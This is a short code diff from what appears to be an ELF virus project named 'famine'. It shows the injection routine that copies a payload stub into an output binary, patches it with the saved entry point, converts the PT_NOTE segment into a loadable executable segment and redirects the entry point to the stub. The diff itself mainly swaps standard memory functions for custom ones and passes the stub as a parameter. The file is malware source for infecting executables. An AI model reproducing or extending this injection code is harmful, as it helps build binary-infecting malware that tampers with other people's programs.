@@ -7,9 +7,9 @@ static void patch64(t_famine *f, uint64_t placeholder, uint64_t value)
 {
 	void *site;
 
-	site = memmem(f->out + f->stub_offset, stub_bin_len, &placeholder, sizeof(placeholder));
+	site = my_memmem(f->out + f->stub_offset, stub_bin_len, &placeholder, sizeof(placeholder));
 	if (site)
-		memcpy(site, &value, sizeof(value));
+		my_memcpy(site, &value, sizeof(value));
 }
 
 /*
@@ -17,9 +17,9 @@ static void patch64(t_famine *f, uint64_t placeholder, uint64_t value)
 * turn the PT_NOTE segment into a loadable exectuable segment that maps it,
 * and point the entry at the stub. The stub jumps back to the saved e_entry.
 */
-void	inject_stub(t_famine *f)
+void	inject_stub(t_famine *f, const unsigned char *stub, size_t stub_len)
 {
-	memcpy(f->out + f->stub_offset, stub_bin, stub_bin_len);
+	my_memcpy(f->out + f->stub_offset, stub, stub_len);
 
 	patch64(f, PLACE_ENTRY, f->ehdr->e_entry);
 	patch64(f, PLACE_PHDR, f->phdr_vaddr);
